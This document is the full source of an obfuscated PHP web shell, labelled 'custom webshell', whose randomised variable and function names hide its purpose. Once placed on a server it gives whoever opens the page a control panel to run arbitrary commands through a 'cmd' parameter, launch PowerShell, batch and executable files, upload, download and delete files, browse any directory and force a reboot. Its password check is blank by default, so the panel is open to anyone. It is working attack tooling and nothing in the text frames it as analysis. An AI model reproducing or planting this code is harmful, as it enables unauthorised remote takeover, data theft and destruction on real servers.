<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->



<?php $iyhdtgcp1a1dc91c907325c69271ddf0='';global $fsjtiuym868d3cb40d275143fc963b14;global $pdjxnfvu020b759adef679a47cb9afe9;if($iyhdtgcp1a1dc91c907325c69271ddf0!=null){if(isset($_COOKIE['pass'])){if(hash('sha512',$_COOKIE['pass'])!==$iyhdtgcp1a1dc91c907325c69271ddf0){echo "Wrong password !";exit;}}else{echo "Wrong password !";exit;}}function Depend6a2f2e0f(string $zziqeiapd6fe1d0be6347b8ef2427fa6):string{$zziqeiapd6fe1d0be6347b8ef2427fa6=mb_ereg_replace('\\\\|/','/',$zziqeiapd6fe1d0be6347b8ef2427fa6,'msr');$thbmjuss3ff401a37a03fe7c08117faf=$zziqeiapd6fe1d0be6347b8ef2427fa6[0]==='/';preg_match('/^[a-z]:/',$zziqeiapd6fe1d0be6347b8ef2427fa6,$wsekyzgm9c28d32df234037773be184d);$fgoqfizw3ecab05b5b8340f3ad9a85c4=isset($wsekyzgm9c28d32df234037773be184d[0])?$wsekyzgm9c28d32df234037773be184d[0]:false;$jcrvxyvyb6a8e8682249b56898e11f47=array_filter(explode('/',$zziqeiapd6fe1d0be6347b8ef2427fa6),'mb_strlen');$qtiqjscp81406cf89f2a977dae20d55f=[];foreach($jcrvxyvyb6a8e8682249b56898e11f47 as $gkqnjkhs1634b7ef7a71f9ae79c4b3b3){if('.'===$gkqnjkhs1634b7ef7a71f9ae79c4b3b3){continue;}if('..'===$gkqnjkhs1634b7ef7a71f9ae79c4b3b3&&!$thbmjuss3ff401a37a03fe7c08117faf&&!$fgoqfizw3ecab05b5b8340f3ad9a85c4&&empty(array_filter($qtiqjscp81406cf89f2a977dae20d55f,function($vmrybvgu2063c1608d6e0baf80249c42){return!('..'===$vmrybvgu2063c1608d6e0baf80249c42);}))){$qtiqjscp81406cf89f2a977dae20d55f[]=$gkqnjkhs1634b7ef7a71f9ae79c4b3b3;continue;}if('..'===$gkqnjkhs1634b7ef7a71f9ae79c4b3b3){array_pop($qtiqjscp81406cf89f2a977dae20d55f);continue;}$qtiqjscp81406cf89f2a977dae20d55f[]=$gkqnjkhs1634b7ef7a71f9ae79c4b3b3;}return(($thbmjuss3ff401a37a03fe7c08117faf?'/':$fgoqfizw3ecab05b5b8340f3ad9a85c4)?$fgoqfizw3ecab05b5b8340f3ad9a85c4.'/':'').implode('/',$qtiqjscp81406cf89f2a977dae20d55f);}if(isset($_POST['upload'])){$ybylawtu14402cfaa3089ce288adfbda=Hang216b3991();$wtcmolof87f85f26c826cf7ccb2ae98b=$ybylawtu14402cfaa3089ce288adfbda.'/'.basename($_FILES['file']['name']);if(file_exists($wtcmolof87f85f26c826cf7ccb2ae98b)){echo "<script>alert('Error: File already exists !')</script>";}else if(move_uploaded_file($_FILES['file']['tmp_name'],$wtcmolof87f85f26c826cf7ccb2ae98b)){echo "<script>alert('File uploaded successfuly !')</script>";}else{echo "<script>alert('Error: Could not upload file !')</script>";}}else if(isset($_GET['runscript'])){$lzfzjfnf3205c0ded576131ea255ad2b=$_GET['runscript'];$ihfyikqt0d858590b2752462cbbd205a=Depend6a2f2e0f($lzfzjfnf3205c0ded576131ea255ad2b);$foyczapc1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -File "'.$ihfyikqt0d858590b2752462cbbd205a.'"';global $fsjtiuym868d3cb40d275143fc963b14;global $pdjxnfvu020b759adef679a47cb9afe9;$fsjtiuym868d3cb40d275143fc963b14=shell_exec($foyczapc1dccadfed7bcbb036c56a4af);}else if(isset($_GET['runexe'])){$lzfzjfnf3205c0ded576131ea255ad2b=$_GET['runexe'];$ihfyikqt0d858590b2752462cbbd205a=Depend6a2f2e0f($lzfzjfnf3205c0ded576131ea255ad2b);$foyczapc1dccadfed7bcbb036c56a4af=$ihfyikqt0d858590b2752462cbbd205a;exec('cd '.realpath(Hang216b3991()).' && '.$ihfyikqt0d858590b2752462cbbd205a,$fsjtiuym868d3cb40d275143fc963b14,$pdjxnfvu020b759adef679a47cb9afe9);}else if(isset($_GET['runbat'])){$lzfzjfnf3205c0ded576131ea255ad2b=$_GET['runbat'];$ihfyikqt0d858590b2752462cbbd205a=Depend6a2f2e0f($lzfzjfnf3205c0ded576131ea255ad2b);$foyczapc1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","'.$ihfyikqt0d858590b2752462cbbd205a.') }';exec('cd '.realpath(Hang216b3991()).' && '.$ihfyikqt0d858590b2752462cbbd205a,$fsjtiuym868d3cb40d275143fc963b14,$pdjxnfvu020b759adef679a47cb9afe9);}else if(isset($_GET['delete'])){$lzfzjfnf3205c0ded576131ea255ad2b=$_GET['delete'];$ihfyikqt0d858590b2752462cbbd205a=Depend6a2f2e0f($lzfzjfnf3205c0ded576131ea255ad2b);$foyczapc1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -Command "& { Write-Output "Deleting file "'.$ihfyikqt0d858590b2752462cbbd205a.'"; $Null = Remove-Item -Path "'.$ihfyikqt0d858590b2752462cbbd205a.'" -Force -ErrorAction Ignore }"';global $fsjtiuym868d3cb40d275143fc963b14;global $pdjxnfvu020b759adef679a47cb9afe9;$fsjtiuym868d3cb40d275143fc963b14[0]=shell_exec($foyczapc1dccadfed7bcbb036c56a4af);}else if(isset($_GET['quickaction'])){$qnzhpqfw418c5509e2171d55b0aee5c2=$_GET['quickaction'];switch($qnzhpqfw418c5509e2171d55b0aee5c2){case "restart":$foyczapc1dccadfed7bcbb036c56a4af='pwsh -noni -nop -Command "& {Restart-Computer -Force}"';$fsjtiuym868d3cb40d275143fc963b14=shell_exec($foyczapc1dccadfed7bcbb036c56a4af);break;default:break;}}if(isset($_GET['download'])){$oikrdkfj8c7dd922ad47494fc02c388e=$_GET['download'];if(file_exists($oikrdkfj8c7dd922ad47494fc02c388e)){if(is_readable($oikrdkfj8c7dd922ad47494fc02c388e)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($oikrdkfj8c7dd922ad47494fc02c388e).'"');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.filesize($oikrdkfj8c7dd922ad47494fc02c388e));readfile($oikrdkfj8c7dd922ad47494fc02c388e);exit;}else{echo "<script>alert('Error: Could not read the file !')</script>";exit;}}}function Mentiond55d7e3b(){return 'rgb(32, 0, 128)';}function Range5590ad39(){return '#00ff00';}function Process0e1584bd(){return '#d92626';}function Announce833d6408(){return '#d0d0d0';}function Surprise0795978a(){return '#ff0066';}function Estimate13711edd(){return '#3ADF00';}function Avoidfb397594(){return '#3ADF00';}function Hang216b3991ectoryColor(){return '#3ADF00';}function Shower21cdc5aa(){return '#ff5500';}function Exist84442ba9(){return '#C0C0C0';}function Appeal3b858a19(){return '#C0C0C0';}function Investigatee5998a3d(){return '#3ADF00';}function Cashd35392df($nfwfvtuyc9e9a848920877e76685b2e4){switch($nfwfvtuyc9e9a848920877e76685b2e4){case 1:return '#101010';break;case 2:return '#202020';break;case 3:return '#303030';break;case 4:return '#404040';break;default:return '#404040';}return '#404040';}function Combinea0cc78a5($ztxbytqob068931cc450442b63f5b3d2){$fkhdicjf7b8b965ad4bca0e41ab51de7=strrpos($ztxbytqob068931cc450442b63f5b3d2,'.');return($fkhdicjf7b8b965ad4bca0e41ab51de7===false)?'':substr($ztxbytqob068931cc450442b63f5b3d2,$fkhdicjf7b8b965ad4bca0e41ab51de7+1);}function Collectfd0a2357($eelfglyq435ed7e9f07f740abf511a62){$pdjxnfvu020b759adef679a47cb9afe9='';$hafhvxzia3da707b651c79ecc39a4986=Hang216b3991().'/'.$eelfglyq435ed7e9f07f740abf511a62;if(is_dir($hafhvxzia3da707b651c79ecc39a4986)){$pdjxnfvu020b759adef679a47cb9afe9.='<td style="color: "'.Hang216b3991ectoryColor().'">';$pdjxnfvu020b759adef679a47cb9afe9.=htmlspecialchars('<dir>');}else{$pdjxnfvu020b759adef679a47cb9afe9.='<td style="color: "'.Process0e1584bd().'">';$bbchxfzz93d565f07a1ee62504ba94b6=Forgete379cbd2(filesize($hafhvxzia3da707b651c79ecc39a4986));$pdjxnfvu020b759adef679a47cb9afe9.=$bbchxfzz93d565f07a1ee62504ba94b6;}$pdjxnfvu020b759adef679a47cb9afe9.='</td>';return $pdjxnfvu020b759adef679a47cb9afe9;}function Kickf57a1690($eelfglyq435ed7e9f07f740abf511a62){$pdjxnfvu020b759adef679a47cb9afe9='';$tdkkmvwgabf77184f55403d75b9d51d7=pathinfo($eelfglyq435ed7e9f07f740abf511a62,PATHINFO_EXTENSION);$pdjxnfvu020b759adef679a47cb9afe9.='<td style="color: "'.Announce833d6408().'"> n/a </td>';return $pdjxnfvu020b759adef679a47cb9afe9;}function Concentrate8233fc9d($eelfglyq435ed7e9f07f740abf511a62){$pdjxnfvu020b759adef679a47cb9afe9='';$tdkkmvwgabf77184f55403d75b9d51d7=pathinfo($eelfglyq435ed7e9f07f740abf511a62,PATHINFO_EXTENSION);if(is_dir($eelfglyq435ed7e9f07f740abf511a62)){echo"\n<!-- DEBUG $eelfglyq435ed7e9f07f740abf511a62 isaDir TRUE -->\n";$pdjxnfvu020b759adef679a47cb9afe9.='<td style="color: "'.Process0e1584bd().'">';$pdjxnfvu020b759adef679a47cb9afe9.=Concern83f27756($eelfglyq435ed7e9f07f740abf511a62);}else{echo"\n<!-- DEBUG $eelfglyq435ed7e9f07f740abf511a62 isaDir FALSE -->\n";$pdjxnfvu020b759adef679a47cb9afe9.='<td style="color: "'.Process0e1584bd().'">';$pdjxnfvu020b759adef679a47cb9afe9.=Reach835ba2ca($eelfglyq435ed7e9f07f740abf511a62);}switch($tdkkmvwgabf77184f55403d75b9d51d7){case "ps1":$pdjxnfvu020b759adef679a47cb9afe9.=Solvec6eb654d($eelfglyq435ed7e9f07f740abf511a62);break;case "bat":$pdjxnfvu020b759adef679a47cb9afe9.=Bendc1ba3859($eelfglyq435ed7e9f07f740abf511a62);break;case "exe":$pdjxnfvu020b759adef679a47cb9afe9.=Poste1965352($eelfglyq435ed7e9f07f740abf511a62);break;default:}$pdjxnfvu020b759adef679a47cb9afe9.='</td>';return $pdjxnfvu020b759adef679a47cb9afe9;}function Gapf1b30585($oikrdkfj8c7dd922ad47494fc02c388e){$pgneeqkn15d61712450a686a7f365adf=fileperms($oikrdkfj8c7dd922ad47494fc02c388e);if($pgneeqkn15d61712450a686a7f365adf&0x1000){$zzbdhfgu599dcce2998a6b40b1e38e8c='p';}else if($pgneeqkn15d61712450a686a7f365adf&0x2000){$zzbdhfgu599dcce2998a6b40b1e38e8c='c';}else if($pgneeqkn15d61712450a686a7f365adf&0x4000){$zzbdhfgu599dcce2998a6b40b1e38e8c='d';}else if($pgneeqkn15d61712450a686a7f365adf&0x6000){$zzbdhfgu599dcce2998a6b40b1e38e8c='b';}else if($pgneeqkn15d61712450a686a7f365adf&0x8000){$zzbdhfgu599dcce2998a6b40b1e38e8c='-';}else if($pgneeqkn15d61712450a686a7f365adf&0xA000){$zzbdhfgu599dcce2998a6b40b1e38e8c='l';}else if($pgneeqkn15d61712450a686a7f365adf&0xC000){$zzbdhfgu599dcce2998a6b40b1e38e8c='s';}else $zzbdhfgu599dcce2998a6b40b1e38e8c='u';$mgncaxkr72122ce96bfec66e2396d2e2["read"]=($pgneeqkn15d61712450a686a7f365adf&00400)?'r':'-';$mgncaxkr72122ce96bfec66e2396d2e2["write"]=($pgneeqkn15d61712450a686a7f365adf&00200)?'w':'-';$mgncaxkr72122ce96bfec66e2396d2e2["execute"]=($pgneeqkn15d61712450a686a7f365adf&00100)?'x':'-';$yaiqdcqpdb0f6f37ebeb6ea094891243["read"]=($pgneeqkn15d61712450a686a7f365adf&00040)?'r':'-';$yaiqdcqpdb0f6f37ebeb6ea094891243["write"]=($pgneeqkn15d61712450a686a7f365adf&00020)?'w':'-';$yaiqdcqpdb0f6f37ebeb6ea094891243["execute"]=($pgneeqkn15d61712450a686a7f365adf&00010)?'x':'-';$tbarjwjo7d793037a0760186574b0282["read"]=($pgneeqkn15d61712450a686a7f365adf&00004)?'r':'-';$tbarjwjo7d793037a0760186574b0282["write"]=($pgneeqkn15d61712450a686a7f365adf&00002)?'w':'-';$tbarjwjo7d793037a0760186574b0282["execute"]=($pgneeqkn15d61712450a686a7f365adf&00001)?'x':'-';if($pgneeqkn15d61712450a686a7f365adf&0x800)$mgncaxkr72122ce96bfec66e2396d2e2["execute"]=($mgncaxkr72122ce96bfec66e2396d2e2['execute']=='x')?'s':'S';if($pgneeqkn15d61712450a686a7f365adf&0x400)$yaiqdcqpdb0f6f37ebeb6ea094891243["execute"]=($yaiqdcqpdb0f6f37ebeb6ea094891243['execute']=='x')?'s':'S';if($pgneeqkn15d61712450a686a7f365adf&0x200)$tbarjwjo7d793037a0760186574b0282["execute"]=($tbarjwjo7d793037a0760186574b0282['execute']=='x')?'t':'T';$vnfuzhsn03c7c0ace395d80182db07ae=sprintf("%1s",$zzbdhfgu599dcce2998a6b40b1e38e8c);$vnfuzhsn03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$mgncaxkr72122ce96bfec66e2396d2e2['read'],$mgncaxkr72122ce96bfec66e2396d2e2['write'],$mgncaxkr72122ce96bfec66e2396d2e2['execute']);$vnfuzhsn03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$yaiqdcqpdb0f6f37ebeb6ea094891243['read'],$yaiqdcqpdb0f6f37ebeb6ea094891243['write'],$yaiqdcqpdb0f6f37ebeb6ea094891243['execute']);$vnfuzhsn03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$tbarjwjo7d793037a0760186574b0282['read'],$tbarjwjo7d793037a0760186574b0282['write'],$tbarjwjo7d793037a0760186574b0282['execute']);return $vnfuzhsn03c7c0ace395d80182db07ae;}function Forgete379cbd2($iizbtjtj4b3a6218bb3e3a7303e8a171){if($iizbtjtj4b3a6218bb3e3a7303e8a171>=1073741824){$iizbtjtj4b3a6218bb3e3a7303e8a171=number_format($iizbtjtj4b3a6218bb3e3a7303e8a171/1073741824,2).' GB';}elseif($iizbtjtj4b3a6218bb3e3a7303e8a171>=1048576){$iizbtjtj4b3a6218bb3e3a7303e8a171=number_format($iizbtjtj4b3a6218bb3e3a7303e8a171/1048576,2).' MB';}elseif($iizbtjtj4b3a6218bb3e3a7303e8a171>=1024){$iizbtjtj4b3a6218bb3e3a7303e8a171=number_format($iizbtjtj4b3a6218bb3e3a7303e8a171/1024,2).' KB';}elseif($iizbtjtj4b3a6218bb3e3a7303e8a171>1){$iizbtjtj4b3a6218bb3e3a7303e8a171=$iizbtjtj4b3a6218bb3e3a7303e8a171.' bytes';}elseif($iizbtjtj4b3a6218bb3e3a7303e8a171==1){$iizbtjtj4b3a6218bb3e3a7303e8a171=$iizbtjtj4b3a6218bb3e3a7303e8a171.' byte';}else{$iizbtjtj4b3a6218bb3e3a7303e8a171='0 bytes';}return $iizbtjtj4b3a6218bb3e3a7303e8a171;}function Hang216b3991(){return isset($_GET['dir'])?realpath($_GET['dir']):getcwd();}function Contactb50fd10c($oikrdkfj8c7dd922ad47494fc02c388e){if(is_dir(Hang216b3991().'/'.$oikrdkfj8c7dd922ad47494fc02c388e)){return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(Hang216b3991().'/'.$oikrdkfj8c7dd922ad47494fc02c388e).'">'.$oikrdkfj8c7dd922ad47494fc02c388e.'</a>';}else{return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(Hang216b3991().'/'.$oikrdkfj8c7dd922ad47494fc02c388e).'">'.$oikrdkfj8c7dd922ad47494fc02c388e.'</a>';}}function Solvec6eb654d($oikrdkfj8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.Depend6a2f2e0f(Hang216b3991().'/'.$oikrdkfj8c7dd922ad47494fc02c388e).'&dir='.realpath(Hang216b3991()).'">'.'run </a>';}function Poste1965352($oikrdkfj8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.Depend6a2f2e0f(Hang216b3991().'/'.$oikrdkfj8c7dd922ad47494fc02c388e).'&dir='.realpath(Hang216b3991()).'">'.'run </a>';}function Reach835ba2ca($oikrdkfj8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?delete='.Depend6a2f2e0f(Hang216b3991().'/'.$oikrdkfj8c7dd922ad47494fc02c388e).'&dir='.realpath(Hang216b3991()).'">'.'del </a>';}function Bendc1ba3859($oikrdkfj8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.Depend6a2f2e0f(Hang216b3991().'/'.$oikrdkfj8c7dd922ad47494fc02c388e).'&dir='.realpath(Hang216b3991()).'">'.'run </a>';}function Concern83f27756($oikrdkfj8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?zipdir='.Depend6a2f2e0f(Hang216b3991().'/'.$oikrdkfj8c7dd922ad47494fc02c388e).'&dir='.realpath(Hang216b3991()).'">'.'zip </a>';}function Illustrate1bd9f7e2(){$iwshmkgm45b963397aa40d4a0063e0d8=scandir(Hang216b3991());$rkuglksgcc935c5faf4c8f7a0468d755=true;if($iwshmkgm45b963397aa40d4a0063e0d8!=null){foreach($iwshmkgm45b963397aa40d4a0063e0d8 as $eelfglyq435ed7e9f07f740abf511a62){echo '<tr style="background-color:'.($rkuglksgcc935c5faf4c8f7a0468d755?'#515151':'#212121').';">';echo '<td style="font-weight:thin;">'.Contactb50fd10c($eelfglyq435ed7e9f07f740abf511a62).'</td>';$viwizarp8b0afb238c3cd824b61190b7=Hang216b3991().'/'.$eelfglyq435ed7e9f07f740abf511a62;if(is_dir($viwizarp8b0afb238c3cd824b61190b7)){$viwizarp8b0afb238c3cd824b61190b7=Hang216b3991().'/'.$eelfglyq435ed7e9f07f740abf511a62;}else{$viwizarp8b0afb238c3cd824b61190b7=$eelfglyq435ed7e9f07f740abf511a62;}echo ''.Collectfd0a2357($eelfglyq435ed7e9f07f740abf511a62).'';if($eelfglyq435ed7e9f07f740abf511a62=='..'||$eelfglyq435ed7e9f07f740abf511a62=='.'){echo ''.Kickf57a1690($viwizarp8b0afb238c3cd824b61190b7).'';}else{echo ''.Concentrate8233fc9d($viwizarp8b0afb238c3cd824b61190b7).'';}echo '</tr>';$rkuglksgcc935c5faf4c8f7a0468d755=!$rkuglksgcc935c5faf4c8f7a0468d755;}}else{echo "<p>Couldn't open that directory !";}}function Seekfaf5643d(){global $fsjtiuym868d3cb40d275143fc963b14;global $pdjxnfvu020b759adef679a47cb9afe9;if($pdjxnfvu020b759adef679a47cb9afe9==0){if($fsjtiuym868d3cb40d275143fc963b14!=null){foreach($fsjtiuym868d3cb40d275143fc963b14 as $lmcpppru6438c669e0d0de98e6929c2c){if($lmcpppru6438c669e0d0de98e6929c2c!=null){echo "<br>";echo htmlspecialchars($lmcpppru6438c669e0d0de98e6929c2c);echo "\n";}}}}else{echo "Execution failed with error code: ".$pdjxnfvu020b759adef679a47cb9afe9;}}function Strain172d4128(){$eptffpgd0897acf49c7c1ea9f76efe59=gethostname()?? 'none';$oethevno14c4b06b824ec59323936251=get_current_user();$xbghkiov736007832d2167baaae763fd=Hang216b3991();$qrzvnvpcdfff0a7fa1a55c8c1a4966c1=isset($_GET['cmd'])?$_GET['cmd']:'';return '<span style="color: #ff6347">'.$oethevno14c4b06b824ec59323936251.'@'.$eptffpgd0897acf49c7c1ea9f76efe59.'</span>: <span style="color: #B40404">'.$xbghkiov736007832d2167baaae763fd.'</span>$ '.$qrzvnvpcdfff0a7fa1a55c8c1a4966c1;}if(isset($_GET['cmd'])){exec('cd '.realpath(Hang216b3991()).' && '.$_GET['cmd'],$fsjtiuym868d3cb40d275143fc963b14,$pdjxnfvu020b759adef679a47cb9afe9);}?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function Collect89ca1302() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
            function Suppose811ed1c4() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo Mentiond55d7e3b();?>;
                --background-color-1: <?php echo Cashd35392df(1);?>;
                --background-color-2: <?php echo Cashd35392df(2);?>;
                --background-color-3: <?php echo Cashd35392df(3);?>;
                --background-color-4: <?php echo Cashd35392df(4);?>;
                --primary-color: <?php echo Range5590ad39();?>;
                --secondary-color: <?php echo Process0e1584bd();?>;
                --command-color: <?php echo Surprise0795978a();?>;
                --commandoutput-color: <?php echo Estimate13711edd();?>;
                --explorer-color: <?php echo Avoidfb397594();?>;
                --directory-color: <?php echo Hang216b3991ectoryColor();?>;
                --navtext-color: <?php echo Shower21cdc5aa();?>;
                --navtext-hover-color: <?php echo Appeal3b858a19();?>;
                --header-text-color: <?php echo Exist84442ba9();?>;
                --buttons-color: <?php echo Investigatee5998a3d();?>;
            }
        </style>
        <script>
            const popupHtmlConfirm = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>HARD REBOOT OF COMPUTER RIGHT NOW!</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Hang216b3991().'&quickaction=restart' ?>" method="POST" enctype="multipart/form-data">
                            <div class="popup-buttons">
                                <button type="button" onclick="Sport36ec1113()">Cancel</button>
                                <input type="submit" value="confirm" name="confirm">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Hang216b3991()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Sport36ec1113()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Hang216b3991()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Sport36ec1113()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function Associateb4a85086(newLocation)
            {
                window.location = newLocation;
                return false;
            }
            function Gather5fac8cc5() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlConfirm + bodyHTML;
            }
            function React8f65770c() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function Encouragee89b64d0() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function Sport36ec1113() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> control panel</h1>
                <div class="nav-items">
                	<a onclick="Gather5fac8cc5()">[restart now]</a>
                    <a onclick="React8f65770c()">[upload]</a>
                    <a onclick="Collect89ca1302()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo Hang216b3991()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php Illustrate1bd9f7e2()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo Strain172d4128()?></p>
                    <p><?php Seekfaf5643d()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo Hang216b3991()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>





